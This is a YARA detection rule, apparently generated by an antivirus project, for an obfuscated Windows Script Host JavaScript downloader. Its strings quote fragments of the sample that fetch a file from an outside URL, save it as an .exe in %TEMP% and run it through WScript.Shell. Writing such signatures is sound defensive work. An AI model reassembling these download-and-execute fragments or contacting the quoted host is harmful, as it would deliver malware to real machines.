rule sig_20160401_0dcd16f24030bae29335a4dd26f17871 {
  meta:
    description = "datamaliciousorder - file 20160401_0dcd16f24030bae29335a4dd26f17871.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6159fdf9e410b641f227d0ab6e16d8225e00eda56703795c648ce390a14c56b6"

  strings:
    $s1  = "var OlQp = function PswDup() {return WScript[QkCmf](\"WScript\"+\".Shell\");}(), SeBdn = 11;" fullword ascii
    $s2  = "function QbQmi(YhQdo, LsoOzp){TnrQo = TnrQo * 1; return YhQdo - LsoOzp;};" fullword ascii
    $s3  = "if (HmuIs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "HmuIs[IwPwl](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s5  = "function UsuWnb(){return XgEd + \"\";};" fullword ascii
    $s6  = "function RnEr() {return OlQp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pVusdcIgL.ex\" + \"e\";};" fullword ascii
    $s7  = "function QrmBub() {return ((XmKbc == true) && (XmKbc == JfMwa)) ? 1 : TnrQo;};" fullword ascii
    $s8  = "}while (LahUao);" fullword ascii
    $s9  = "return QbQmi(BnXd, RebFz);" fullword ascii
    $s10 = "function DnoWi(JdzHjt) {var VfkOqo = (1, 2, 3, 4, 5, JdzHjt); return VfkOqo;};" fullword ascii
    $s11 = "function VjjWd(){return 23;};" fullword ascii
    $s12 = "function NyBnb()" fullword ascii
    $s13 = "var XmKbc = false;" fullword ascii
    $s14 = "var ZrtVrt = false;" fullword ascii
    $s15 = "function TzsApl(){return QkCmf;};" fullword ascii
    $s16 = "JfMwa = true; " fullword ascii
    $s17 = "XmKbc = true; " fullword ascii
    $s18 = "function LbLlx(KeVrb){OlQp[\"R\"+\"un\"](KeVrb, TnrQo, TnrQo);};" fullword ascii
    $s19 = "var MapZm = new this[\"Date\"]();" fullword ascii
    $s20 = "var JfMwa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}